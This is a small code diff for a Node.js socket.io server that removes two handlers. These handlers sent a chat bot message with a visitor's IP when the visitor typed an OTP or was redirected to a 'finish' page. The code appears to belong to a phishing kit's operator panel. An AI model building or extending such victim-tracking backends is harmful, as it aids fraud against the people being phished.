@@ -244,13 +244,6 @@ io.on('connection', (socket, req) => {
         io.to(ip).emit('choice', data)
     });
 
-    socket.on('confirmation_bad', (data) => {
-        bot.sendMessage(chatId, `${userIP}\n User type otp...`);
-    })
-
-    socket.on('confirmation_good', (data) => {
-        bot.sendMessage(chatId, `${userIP}\n The user was redirect to page finish !`);
-    })
 
 });
 
